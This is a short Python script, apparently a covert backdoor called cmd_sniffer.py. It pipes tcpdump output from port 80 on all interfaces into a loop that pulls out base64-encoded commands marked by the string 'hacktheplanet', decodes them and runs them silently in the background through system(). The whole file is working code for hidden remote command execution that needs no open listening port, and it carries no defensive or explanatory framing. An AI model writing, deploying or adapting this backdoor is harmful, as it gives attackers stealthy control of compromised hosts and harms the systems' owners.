#!/usr/bin/python

from sys import *
from os import *
from base64 import b64decode

#Run String: nohup ./cmd_sniffer.py 2>/dev/null &



#Process will split into sniffer->processor module.
#Sniffer portion listens on port 80 on all interfaces and sends output to processor.
#Processor portion looks for the magicstring and executes commands found between two magicstrings.
def become_sniffer():

	port_string = "(port 80)"

	pipe_r, pipe_w = pipe()

	pid = fork()

	if(pid != 0): #Parent, becomes tcpdump

		#Copy our pipe_w fd to stdout so that anything going to stdout will now go to the pipe.
		dup2(pipe_w, 1)

		#tcpdump -nns 0 -A -l -i any '(port 80)'
		execl('/usr/sbin/tcpdump','-nn','-s','0','-A','-l', '-i', 'any', port_string)


	else: #Child

		#Copy our pipe_r fd to stdin so that anything from stdin can be read from the pipe.
		dup2(pipe_r, 0)

		while(True): #Try to read new input forever

			try:
				nextline = stdin.readline()
				splits = nextline.split("hacktheplanet")
				if(len(splits) == 3): #Found a command
					command = "nohup " + b64decode(splits[1]) + " 2>/dev/null &"
					system(command) #Execute command in the background
			except:
				#Pipe read failure (could be no data or pipe died)
				continue


become_sniffer()
